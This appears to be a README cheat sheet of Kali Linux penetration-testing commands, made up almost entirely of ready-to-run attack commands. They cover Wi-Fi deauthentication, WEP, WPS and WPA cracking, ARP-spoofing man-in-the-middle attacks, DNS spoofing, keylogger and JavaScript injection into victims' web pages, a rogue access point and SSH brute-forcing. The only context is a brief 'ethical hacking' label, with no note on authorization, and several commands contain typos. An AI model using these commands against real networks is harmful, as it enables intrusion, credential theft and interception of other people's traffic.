# Useful Hacking and Penetration Testing Commands

Useful commands in Kali Linux for penetration testing and ethical hacking

## Helpful Linux Commands

1. zip a file: `tar czvf <filename>`
2. unzip file: `tar xzvf <filename>`
3. network info: `netstat`
4. last user logged in the system: `last`
5. who is logged in: `who` or `w`: 
6. network downloader: `wget <url-link>`
7. change permission: `chmod`
8. send file to a remote computer: `scp /path/to/file username@remoteIP:~/path/to/file`
9. From remote server to local computer: `scp username@remoteIP:~/path/to/file /path/to/file` 
10. View information about your own device: `ifconfig`
11. Veiw information about wireless interfaces: `iwconfig`
12. Change wireless adapter into monitor mode: `iwconfig <InterfaceName> mode monitor`
13. Shows routers: `route -n`
14. Scan connected devices in the network: `nmap -sP 192.168.1.1/24`



## Preconnection Attack: Airodump-ng

Discover wireless networks within range:
```bash
airodump-ng <infterface>
```

To sniff packets in the selected network: 

```bash
airodump-ng --bssid <TargetMacAddress> --channel <ChannelOfTargetNetwork> --write <FileName> <interface> 
```

The test file will be available with the .cap file. 
View the .cap file in ```wireshark test.cap```

## Deauthentication Attack

Disconnect any client fromm any network: 

```bash
aireplay-ng --dauth <NumOfPackets> -a <NetworkMacAddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface>
```
## WEP Cracking

1. Capture a large number of packets with airodump-ng
```bash
airodump-ng --bssid <NetworkMacAddress> --channel <channel> --write <FileName> <interface> 
```
2. Analyse the captured packets and crack the key with aircrack-ng
```bash
aircrack-ng <.capfile>
```
3. output: KEY IS FOUND
4. Remove the colons from the key and use it as password

## Fake Authentication Attack

```bash
aireplay-ng --fakeauth 0 -a <TargetMacAddress> -h <WirelessAdapterMacAddress> <interface>
```
**NOTE: Type "ifconfig" to view wireless adapter mac address (unspec ---> first 12 digits)**

This attack injects packets in the network.

## WPA/WPA2
If WPS is Enable:
1. Displays networks with WPS enabled
```bash 
wash --interface <interface>
```
2. 
```bash
aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <interface>
```
3. Run Reaver in another terminal window
```bash
reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <interface> -vvv --no-associate
```
**NOTE: if bug error, then download older version of reaver and run ./reaver ____**

4. Results: WPS PIN and WPA PSK

If WPS is disable:
1. Capture Handshake between devices
```bash
airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <interface>
```
- Wait for the handshake
- wait for a new client or disconnect a client with a fake auth attack. 
- WPA handshake stored in the file 

- Create a wordlist
```bash 
crunch [min][max][characters] -T[pattern] -o [FileName]
```
Example:
```bash
crunch 6 8 abc12 -o test.txt
```
2. Wordlist attack 
```bash
aircrack-ng <handshake.cap> -w <WordListFile.txt>
```

## Man In The Middle Attack (MITM)

1. Scan the network IP with `zenmap` 
Example: 192.168.1.1/24

2. To map IP addresses in the network and mac addresses `arp -a`
3. `arpspoof -i <interface> -t <clientIP> <gatewayIP>`
4. In another window. Tell the router I am the victim: `aprspoof -i <interface> -t <gatewayIP> <clientIP>`
5. In another window. Allow Linx be the router and forward packets: `echo 1 > /proc/sys/net/ipv4/ip_forward`

## Man in the Middle Framework (MITMf)

Download the tool `apt-get install mitmf`

```bash 
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface>
```
Use wireshark to sniff packets

## DNS Spoofing with MITMf
1. Start the web server: `service apache2 start` (var/www/html)
2. Configure the A records and add the domain you want to change into your IP address (*.___.com = <MyIPAddress>): 
`leafpad /etc/mitmf/mitmf.conf`
3. `mitmf --arp --spoof --gateway <routerIP> --target <targetIP> -i <interface> --dns`

## Capturing Screen of Target with MITMf
Takes screenshots of the target machine 
They are stored into ghe log directory `var/log/mitmf/
(--screenshotter)
```bash 
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --screen --interval <seconds>
```

## JS Keylogger with MITMf
Injects javascript key logger into a client's webpage
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --jskeylogger
```

## MITMf code injection
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-payload <"javascriptcode">
```
```bash
mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-file </path/to/jsfile>
```

## MITMf Upsidedownternet
```bash 
mitmf --arp --spoof --hsts --gateway <routerIP> --target <targetIP> -i <interface> --upsidedownternet
```

**NOTE: if working in real network:**
- Disconnect from virtual network --> Devices --> network --> uncheck (offline) 

## Creating Fake Access Point 
1. Download tool `apt-get intall manatoolkit`
2. `start-nat-simple.sh`
3. Edit the settings: `leafpad /etc/mana-toolkit/hostapd-mana.conf`
- Change interface = <interface> (wlan0)
- ssid = name of the fake network
4. Edit: `leafpad /usr/share/mana-toolkit/run-mana/start-nat/simple.sh`
- upstream = eth0
- phy = <interface> (wlan0)
5. start fake AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
6. Test it with phone or other machine, NOT host machine. 

## NMAP Basics

- Scan a single IP	`nmap 192.168.1.1`
- Scan a host	`nmap www.testhostname.com`
- Scan a range of IPs	`nmap 192.168.1.1-20`
- Scan a subnet	`nmap 192.168.1.0/24`

### Port Selection
- Scan a single Port	`nmap -p 22 192.168.1.1`
- Scan a range of ports	`nmap -p 1-100 192.168.1.1`
- Scan 100 most common ports (Fast)	`nmap -F 192.168.1.1`
- Scan all 65535 ports	`nmap -p- 192.168.1.1`

### Service and OS Detection
- Detect OS and Services	`nmap -A 192.168.1.1`
- Standard service detection	`nmap -sV 192.168.1.1`
- More aggressive Service Detection	`nmap -sV --version-intensity 5 192.168.1.1`
- Lighter banner grabbing detection	`nmap -sV --version-intensity 0 192.168.1.1`


## Brutespray 

1. nmap the network with: `nmap -sS -sV 10.0.2.0/24 -vv -n -oA test`
2. `brutespray --file test.gnmap -t 5 -T 2`
3. `cat` the succeeded files. 

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)